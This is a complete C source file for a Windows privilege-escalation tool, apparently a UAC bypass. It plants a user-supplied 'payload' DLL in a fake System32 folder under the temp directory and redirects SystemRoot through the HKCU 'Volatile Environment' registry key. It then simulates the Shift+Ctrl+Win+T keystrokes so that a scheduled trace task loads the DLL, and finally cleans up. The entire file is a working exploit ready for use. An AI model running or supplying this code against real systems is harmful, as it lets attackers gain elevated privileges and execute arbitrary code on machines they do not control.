#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include <windows.h>

#define DLLPATH "\\System32"
#define DLLNAME "\\PerformanceTraceHandler.dll"

#define ENVREGKEY "Volatile Environment"
#define ENVREGKEY2 "Volatile Environment\\0"
#define ENVREGVALUE "SystemRoot"

#define WAITFORTASK 2500

BOOL CopyPayloadDLL(char* dllfile, char* basepath)
{
	char dllpath[MAX_PATH];
	int dir_len = 0;

	(void)lstrcpynA(dllpath, basepath, MAX_PATH - 1 - sizeof(DLLPATH) - sizeof(DLLNAME));
	lstrcatA(dllpath, DLLPATH);
	dir_len = lstrlenA(dllpath);
	if (!CreateDirectoryA(dllpath, NULL))
	{
		if (GetLastError() != ERROR_ALREADY_EXISTS)
		{
			return FALSE;
		}
	}
	lstrcatA(dllpath, DLLNAME);
	if (!CopyFileA(dllfile, dllpath, FALSE))
	{
		dllpath[dir_len] = '\0';
		RemoveDirectoryA(dllpath);
		return FALSE;
	}
	return TRUE;
}

BOOL DeletePayloadDLL(char* basepath)
{
	char dllpath[MAX_PATH];
	int dir_len = 0;

	(void)lstrcpynA(dllpath, basepath, MAX_PATH - 1 - sizeof(DLLPATH) - sizeof(DLLNAME));
	lstrcatA(dllpath, DLLPATH);
	dir_len = lstrlenA(dllpath);
	lstrcatA(dllpath, DLLNAME);
	if (!DeleteFileA(dllpath))
	{
		return FALSE;
	}
	dllpath[dir_len] = '\0';
	if (!RemoveDirectoryA(dllpath))
	{
		return FALSE;
	}
	return TRUE;
}

BOOL CreateEnvEntryFunction(char* basepath)
{
	HKEY key = NULL;

	if (RegOpenKeyExA(HKEY_CURRENT_USER, ENVREGKEY, 0, KEY_SET_VALUE, &key))
	{
		return FALSE;
	}
	if (RegSetValueExA(key, ENVREGVALUE, 0, REG_SZ, basepath, lstrlenA(basepath) + 1))
	{
		RegCloseKey(key);
		return FALSE;
	}
	RegCloseKey(key);

	return TRUE;
}

BOOL DeleteEnvEntryFunction()
{
	HKEY key = NULL;

	if (RegOpenKeyExA(HKEY_CURRENT_USER, ENVREGKEY, 0, KEY_SET_VALUE, &key))
	{
		return FALSE;
	}
	RegDeleteValueA(key, ENVREGVALUE);
	RegCloseKey(key);

	return TRUE;
}

void Cleanup(char* basepath)
{
	DeleteEnvEntryFunction();
	DeletePayloadDLL(basepath);
}

BOOL PressShiftCtrlWinT()
{
	INPUT inputs[8];
	memset(&inputs[0], 0, sizeof(inputs));

	inputs[0].type = INPUT_KEYBOARD;
	inputs[0].ki.wVk = VK_LSHIFT;

	inputs[1].type = INPUT_KEYBOARD;
	inputs[1].ki.wVk = VK_LCONTROL;

	inputs[2].type = INPUT_KEYBOARD;
	inputs[2].ki.wVk = VK_LWIN;

	inputs[3].type = INPUT_KEYBOARD;
	inputs[3].ki.wVk = 'T';

	inputs[4].type = INPUT_KEYBOARD;
	inputs[4].ki.wVk = 'T';
	inputs[4].ki.dwFlags = KEYEVENTF_KEYUP;

	inputs[5].type = INPUT_KEYBOARD;
	inputs[5].ki.wVk = VK_LWIN;
	inputs[5].ki.dwFlags = KEYEVENTF_KEYUP;

	inputs[6].type = INPUT_KEYBOARD;
	inputs[6].ki.wVk = VK_LCONTROL;
	inputs[6].ki.dwFlags = KEYEVENTF_KEYUP;

	inputs[7].type = INPUT_KEYBOARD;
	inputs[7].ki.wVk = VK_LSHIFT;
	inputs[7].ki.dwFlags = KEYEVENTF_KEYUP;

	return (SendInput(8, &inputs[0], sizeof(INPUT)) > 0);
}

void print_help(char* executable)
{
	printf("Usage: %s [bypass|cleanup] [dll path]\n", executable);
}

int main(int argc, char** argv)
{
	char tmppath[MAX_PATH];

	if (argc < 2)
	{
		print_help(argv[0]);
		return 1;
	}
	if (!GetTempPathA(MAX_PATH - 1, tmppath))
	{
		printf("GetTempPath failed: %u!\n", GetLastError());
		return 1;
	}
	if (!lstrcmpiA(argv[1], "cleanup"))
	{
		Cleanup(tmppath);
		return 0;
	}
	if (lstrcmpiA(argv[1], "bypass"))
	{
		print_help(argv[0]);
		return 1;
	}
	if (argc < 3)
	{
		print_help(argv[0]);
		return 1;
	}
	printf("Copy DLL file \"%s\" ...\n", argv[2]);
	if (!CopyPayloadDLL(argv[2], tmppath))
	{
		printf("CopyPayloadDLL failed: %u!\n", GetLastError());
		return 1;
	}
	printf("Set environment \"%s\" value to \"%s\" ...\n", ENVREGVALUE, tmppath);
	if (!CreateEnvEntryFunction(tmppath))
	{
		printf("CreateEnvEntryFunction failed: %u!\n", GetLastError());
		DeletePayloadDLL(tmppath);
		return 1;
	}
	printf("Pressing Shift+Ctrl+Win+T to start the RequestTrace Task ...\n");
	if (!PressShiftCtrlWinT())
	{
		printf("PressShiftCtrlWinT failed: %u!\n", GetLastError());
		Cleanup(tmppath);
		return 1;
	}
	printf("Wait for Task to start ...\n");
	Sleep(WAITFORTASK);
	printf("Cleanup ...\n");
	Cleanup(tmppath);

	return 0;
}
